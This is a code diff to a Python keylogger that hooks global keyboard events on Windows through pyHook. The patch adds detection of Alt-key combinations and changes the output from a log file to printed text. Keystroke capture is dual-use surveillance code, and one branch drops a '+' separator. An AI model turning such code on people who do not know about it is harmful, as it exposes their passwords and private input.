@@ -1,4 +1,4 @@
-from pyHook import HookManager, GetKeyState, HookConstants
+from pyHook import HookManager, GetKeyState, HookConstants, KeyboardEvent
 from pythoncom import PumpMessages
 from sys import stdout
 from logging import getLogger, FileHandler, Formatter, DEBUG
@@ -7,7 +7,6 @@ import string
 
 import pdb
 
-# TODO supress RuntimeWarning. figure out alt error.
 
 class KeyLogger(object):
 
@@ -34,6 +33,12 @@ class KeyLogger(object):
         """
         return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))
 
+    def alt_down(self, event):
+        """ Determine if either alt key is pressed
+
+        """
+        return KeyboardEvent.IsAlt(event)
+
     def key_log(self, event):
         """ Properly record key presses
 
@@ -41,8 +46,17 @@ class KeyLogger(object):
         key=event.GetKey()
         ctrl = self.ctrl_down()
         shift = self.shift_down()
-        if ctrl and shift:
+        alt = self.alt_down(event)
+        if ctrl and shift and alt:
+            final_key = "ctrl+shift+alt+"+key
+        elif ctrl and shift:
             final_key = "ctrl+shift+"+key
+        elif shift and alt:
+            final_key = "shift+alt"+key
+        elif ctrl and alt:
+            if key in string.ascii_uppercase:
+                final_key = "ctrl+alt+"+key.lower()
+            else: final_key = "ctrl+alt+"+key
         elif ctrl:
             if key in string.ascii_uppercase:
                 final_key = "ctrl+"+key.lower()
@@ -50,6 +64,11 @@ class KeyLogger(object):
                 final_key = "ctrl+"+key
         elif shift:
             final_key = "shift+"+key
+        elif alt:
+            if key in string.ascii_uppercase:
+                final_key = "alt+"+key.lower()
+            else:
+                final_key = "alt+"+key
         else:
             if key in string.ascii_uppercase:
                 final_key = key.lower()
@@ -63,7 +82,8 @@ class KeyLogger(object):
 
         Default functionality logs keys to file.
         """
-        self.logger.info(str(key))
+        #self.logger.info(str(key))
+        print str(key)
 
     def hook(self):
         """ Hook Keyboard
@@ -87,5 +107,5 @@ class KeyLogger(object):
 
 
 if __name__ == "__main__":
-    kl = KeyLogger()
+    kl = KeyLogger(logging=False)
     kl.start_capture()
